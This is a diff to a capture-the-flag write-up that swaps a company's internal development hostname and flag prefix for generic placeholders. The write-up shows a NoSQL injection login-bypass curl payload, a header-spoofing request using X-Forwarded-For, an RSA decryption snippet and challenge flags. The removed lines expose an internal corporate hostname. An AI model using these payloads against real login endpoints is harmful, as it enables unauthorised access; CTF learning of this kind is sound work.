@@ -29,7 +29,7 @@
 - NoSQL injection with $gt or $ne (companyctf{n05ql_d0e5_n07_m34n_n0_1nj3ct10n})
 
 ```
-curl -H "Content-type: application/json" -d '{"username": {"$gt":""}, "password": {"$gt": ""}}' https://nosql.axa-li-jp-dev-int.pink.ap-southeast-1.aws.openpaas.axa-cloud.com/login
+curl -H "Content-type: application/json" -d '{"username": {"$gt":""}, "password": {"$gt": ""}}' https://nosql.yourdomain.com/login
 ```
 
 - Bling NoSQL injection with $regex to get the real password (companyctf{th1s_1s_called_bl1nd_5ql_1nj3ct10n})
@@ -59,7 +59,7 @@ bytes.fromhex(h[2:]).decode()
   - a specific content-type
   - some data
   - x-forwarded-for header
-- final request: curl -A "AxaBrowser" -XPOST -H "Content-Type: application/json" -H "X-Forwarded-For: 127.0.0.1" -d '{"amount": 1000000, "currency": "dollars"}' http://localhost:8080/
+- final request: curl -A "CompanyBrowser" -XPOST -H "Content-Type: application/json" -H "X-Forwarded-For: 127.0.0.1" -d '{"amount": 1000000, "currency": "dollars"}' http://localhost:8080/
 - flag: companyctf{f0ll0w_7h3_gu1d3_4nd_kn0w_y0ur_r3que57}
 
 ## RSA
@@ -73,12 +73,12 @@ d = inverse(e, phi)
 m = pow(c,d,n)
 hex(m)
 ```
-- flag: axa_ctf{rs4_1s_n0t_th4t_c0mpl1c4t3d_1_gu355}
+- flag: companyctf{rs4_1s_n0t_th4t_c0mpl1c4t3d_1_gu355}
 
 ## UXUI
 
 - go through the website and find the flag at the end
-- flag: axa_ctf{th4t_w4s_th3_w0r5t_UI_p0ss1bl3_th4nk5}
+- flag: companyctf{th4t_w4s_th3_w0r5t_UI_p0ss1bl3_th4nk5}
 
 ## So much fun in the bucket
 
